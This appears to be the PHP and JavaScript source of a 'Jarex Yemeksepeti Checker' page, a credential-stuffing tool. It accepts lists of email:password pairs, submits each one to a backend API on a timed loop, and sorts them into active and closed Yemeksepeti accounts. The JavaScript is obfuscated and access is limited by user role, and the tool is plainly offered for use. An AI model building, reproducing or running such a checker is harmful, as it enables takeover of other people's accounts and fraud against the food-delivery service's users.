<?php


$customCSS = array();
$customJAVA = array();

$page_title = 'Yemek Sepeti';

include('inc/header_main.php');
include('inc/header_sidebar.php');
include('inc/header_native.php');
?>
<!--BAŞLANGIC-->
<div class="card-body">
    <div class="md-form">
        <div class="col-md-12">
            <center>
                <div class="md-form">
                    <h4 class="card-title mb-4"><i class="fas fa-user-circle"></i> Jarex Yemeksepeti Checker</h4>
                    <p>Bu bölümden Yemeksepeti hesaplarınızı kolaylıkla checkleyebilirsiniz!</p>
                    <div style="margin-bottom: 10px;">
                        <strong>Örnek format: </strong> <a>test@gmail.com:sifre</a>
                    </div>
                    <textarea type="text" style="text-align: center; background-color: rgba(255, 255, 255, .1);color:white ;" placeholder="Hesaplarınızı buraya giriniz." ; id="lista" class="md-textarea form-control" rows="4"></textarea>
                    <div class="mb-3 mt-3"><label class="form-label"></label>
                        <button id="testar" onclick="enviar()" type="button" class="btn waves-effect waves-light btn-rounded btn-primary" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-play"></i> Başlat</button>
                        <button id="stoper" type="button" class="btn waves-effect waves-light btn-rounded btn-danger" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-stop"></i> Durdur</button>
                        <button id="temizleButon" type="button" class="btn waves-effect waves-light btn-rounded btn-warning" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-trash-alt"></i> Temizle</button>
                    </div>
                </div>
        </div>
        </center>
    </div>

    <div class="card-body">
        <div class="alert alert-success" role="alert">AKTIF HESAP <span id="cCharge2"></span></h6>
        </div>
        <div id="bode1"><span id=".aprovadas" class="aprovadas"></span>
        </div>
        <div class="alert alert-danger" role="alert">KAPALI HESAP <span id="cDie2"></span></h6>
        </div>
        <div id="bode2"><span id=".reprovadas" class="reprovadas"></span>
        </div>
    </div>
</div>
</div>

<script>
    (function(_0x5573d6, _0xa5e619) {
        var _0x29ae6d = _0x268b,
            _0x4cbb2e = _0x5573d6();
        while (!![]) {
            try {
                var _0x2c4bb4 = parseInt(_0x29ae6d(0x1af)) / 0x1 + parseInt(_0x29ae6d(0x1be)) / 0x2 * (-parseInt(_0x29ae6d(0x1b3)) / 0x3) + -parseInt(_0x29ae6d(0x1b2)) / 0x4 * (-parseInt(_0x29ae6d(0x1a9)) / 0x5) + -parseInt(_0x29ae6d(0x1ba)) / 0x6 + -parseInt(_0x29ae6d(0x1bf)) / 0x7 * (-parseInt(_0x29ae6d(0x1a8)) / 0x8) + parseInt(_0x29ae6d(0x1b0)) / 0x9 * (-parseInt(_0x29ae6d(0x1cc)) / 0xa) + parseInt(_0x29ae6d(0x1c9)) / 0xb * (-parseInt(_0x29ae6d(0x1cd)) / 0xc);
                if (_0x2c4bb4 === _0xa5e619) break;
                else _0x4cbb2e['push'](_0x4cbb2e['shift']());
            } catch (_0x221b9b) {
                _0x4cbb2e['push'](_0x4cbb2e['shift']());
            }
        }
    }(_0x2219, 0x5d80a));

    function _0x268b(_0x4ebd7c, _0xdd77f9) {
        var _0x2219a0 = _0x2219();
        return _0x268b = function(_0x268b86, _0xf85eb0) {
            _0x268b86 = _0x268b86 - 0x1a5;
            var _0x4603cd = _0x2219a0[_0x268b86];
            return _0x4603cd;
        }, _0x268b(_0x4ebd7c, _0xdd77f9);
    }

    function enviar() {
        var roleNumber = "<?= $k_rol ?>";
        if (parseInt(roleNumber) == 1 || parseInt(roleNumber) == 2) {
            var _0x2a4461 = _0x268b,
                _0x597f58 = $(_0x2a4461(0x1b6))['val'](),
                _0x2d5007 = _0x597f58[_0x2a4461(0x1ab)]('\x0a'),
                _0x491160 = _0x2d5007[_0x2a4461(0x1a5)],
                _0x420090 = 0x0,
                _0x1286f3 = 0x0,
                _0x1250f9 = 0x0;
            _0x2d5007[_0x2a4461(0x1ac)](function(_0x304193, _0x4f6a2a) {
                setTimeout(function() {
                    var _0x3088e1 = _0x268b;
                    $['ajax']({
                        'url': _0x3088e1(0x1a7) + _0x304193,
                        'type': _0x3088e1(0x1b8),
                        'async': !![],
                        'success': function(_0x1a01b8) {
                            var _0x20c035 = _0x3088e1;
                            _0x1a01b8[_0x20c035(0x1cb)]('#Aktif') ? (removelinha(), _0x420090++, aprovadas(_0x1a01b8 + '')) : (removelinha(), _0x1250f9++, reprovadas(_0x1a01b8 + ''));
                            $(_0x20c035(0x1c2))[_0x20c035(0x1c4)](_0x491160);
                            var _0x17a6ef = parseInt(_0x420090) + parseInt(_0x1286f3) + parseInt(_0x1250f9);
                            $(_0x20c035(0x1b1))['html'](_0x420090), $(_0x20c035(0x1c7))[_0x20c035(0x1c4)](_0x1286f3), $(_0x20c035(0x1c6))[_0x20c035(0x1c4)](_0x1250f9), $(_0x20c035(0x1bb))[_0x20c035(0x1c4)](_0x17a6ef), $(_0x20c035(0x1b1))['html'](_0x420090), $(_0x20c035(0x1bd))[_0x20c035(0x1c4)](_0x1286f3), $(_0x20c035(0x1b4))[_0x20c035(0x1c4)](_0x1250f9);
                        }
                    });
                }, 0x1f4 * _0x4f6a2a);
            });
        } else {
            Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: 'Bu çözümü kullanman için yeterli yetkin bulunmuyor!',
            })
        }
    }

    function aprovadas(_0x8e46ab) {
        var _0x3bceba = _0x268b;
        $(_0x3bceba(0x1b7))[_0x3bceba(0x1a6)](_0x8e46ab + '<br>');
    }

    function reprovadas(_0x2727fa) {
        var _0x39eff1 = _0x268b;
        $(_0x39eff1(0x1aa))['append'](_0x2727fa + _0x39eff1(0x1bc));
    }

    function edrovadas(_0x759678) {
        var _0x96353e = _0x268b;
        $(_0x96353e(0x1c8))[_0x96353e(0x1a6)](_0x759678 + '<br>');
    }

    function removelinha() {
        var _0x1773cb = _0x268b,
            _0x1b237f = $(_0x1773cb(0x1b6))[_0x1773cb(0x1c3)]()['split']('\x0a');
        _0x1b237f[_0x1773cb(0x1b5)](0x0, 0x1), $(_0x1773cb(0x1b6))[_0x1773cb(0x1c3)](_0x1b237f[_0x1773cb(0x1c5)]('\x0a'));
    }

    function copyToClipboard(_0x3b3133) {
        var _0x1c3083 = _0x268b,
            _0x184711 = $(_0x1c3083(0x1ca));
        $(_0x1c3083(0x1c0))[_0x1c3083(0x1a6)](_0x184711), _0x184711['val']($(_0x3b3133)[_0x1c3083(0x1ad)]())[_0x1c3083(0x1ae)](), document[_0x1c3083(0x1c1)](_0x1c3083(0x1b9)), _0x184711['remove']();
    }

    function _0x2219() {
        var _0x5a4ced = ['537899GizLWL', '452052UKbDEk', '#cCharge2', '148wRJfKe', '19023SHftIp', '#cDie2', 'splice', '#lista', '.aprovadas', 'GET', 'copy', '1216578LiEaLY', '#total', '<br>', '#cWarn2', '62CSfSPD', '420DdFvOn', 'body', 'execCommand', '#carregadas', 'val', 'html', 'join', '#cDie', '#cWarn', '.edrovadas', '473JZjLKD', '<input>', 'match', '20SbnHLC', '261564gpjqyX', 'length', 'append', '../api/yemeksepeti/api.php?lista=', '80456UwManl', '91720aZQMfp', '.reprovadas', 'split', 'forEach', 'text', 'select'];
        _0x2219 = function() {
            return _0x5a4ced;
        };
        return _0x2219();
    }
</script>
<br>
<!--BİTİŞ-->
<?php
include('inc/footer_native.php');
include('inc/footer_main.php');
?>